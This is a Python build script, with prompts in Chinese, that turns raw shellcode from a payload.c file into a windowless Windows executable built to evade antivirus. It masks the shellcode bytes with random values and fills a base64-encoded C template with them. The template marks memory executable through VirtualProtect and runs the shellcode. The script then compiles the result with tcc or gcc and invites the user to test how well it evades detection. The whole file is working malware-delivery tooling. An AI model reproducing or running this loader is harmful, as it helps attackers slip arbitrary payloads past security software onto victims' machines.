import os
import sys
import re
import random
import json
import base64

code = 'I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxXaW5kb3dzLmg+CgoKLyokY29kZSQqLwoKaW50IGxlbiA9IHNpemVvZih2MykgLyBzaXplb2YoKnYzKTsKCnVuc2lnbmVkIGNoYXIgYnVmZltzaXplb2YodjMpIC8gc2l6ZW9mKCp2MyldID0gezB9OwoKdHlwZWRlZiBCT09MKFdJTkFQSSAqVmlyVHVhbCkoCiAgICBMUFZPSUQgQWRkciwKICAgIERXT1JEIFNpemUsCiAgICBEV09SRCBOZXcsCiAgICBQRFdPUkQgT2xkKTsKCmludCBtYWluKCkKewogICAgVmlyVHVhbCBWVCA9IChWaXJUdWFsKUdldFByb2NBZGRyZXNzKAogICAgICAgIEdldE1vZHVsZUhhbmRsZUEoIktlcm5lbDMyLmRsbCIpLAogICAgICAgICJWaXJ0dWFsUHJvdGVjdCIpOwogICAgZm9yIChpbnQgaSA9IDA7IGkgPCBsZW47IGkrKykKICAgIHsKICAgICAgICBidWZmW2ldID0gdjNbaV07CiAgICB9CgogICAgRFdPUkQgb2xkOwogICAgVlQoYnVmZiwgc2l6ZW9mKGJ1ZmYpLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCAmb2xkKTsKICAgICgodm9pZCAoKikoKSlidWZmKSgpOwogICAgcmV0dXJuIDA7Cn0='
    
payloadfile = r'payload.c'

if not os.path.isfile(payloadfile):
    print("未在当前目录检测到payload")
    path = input("请输入payload.c绝对路径(默认读取当前目录):\n")
    if len(path) > 0:
        payloadfile = path

if not os.path.isfile(payloadfile):
    print("payload不存在")
    sys.exit(0)

payloadstr = ''
with open(payloadfile, "r") as f:
    content = f.read()
    result = re.findall(r'\\x(\w\w)', content)
    for i in result:
        payloadstr += i

v1 = []
for i in range(len(result)):
    num = int(result[i], 16)
    n = random.randint(0,250)
    v1.append(256*n+num)

def ListToStr(list):
    str = json.dumps(list)
    str = str.replace("[", "{").replace("]", "}")
    return str

with open("shell.c", "w", encoding="utf-8") as f:
    payload = ""
    payload += 'unsigned int v3[] = %s;\n' % ListToStr(v1)

    content = base64.b64decode(code).decode()
    content = content.replace("/*$code$*/", payload)
    f.seek(0)
    f.write(content)

if os.system("tcc -v") == 0:
    print("~使用tcc编译~")
    os.system("tcc shell.c -Wl,--subsystem,gui")
    print("shell.exe编译成功，请自行测试免杀效果")
    os.remove("shell.c")
elif os.system("gcc -v") == 0:
    print("~使用gcc编译~")
    os.system("gcc shell.c -mwindows -o shell.exe -O3 -s")
    print("shell.exe编译成功，请自行测试免杀效果")
    os.remove("shell.c")
else:
    print("编译器不存在，请输入命令手动编译")
    print("示例命令: ")
    print("gcc shell.c -mwindows -o shell.exe -s\n")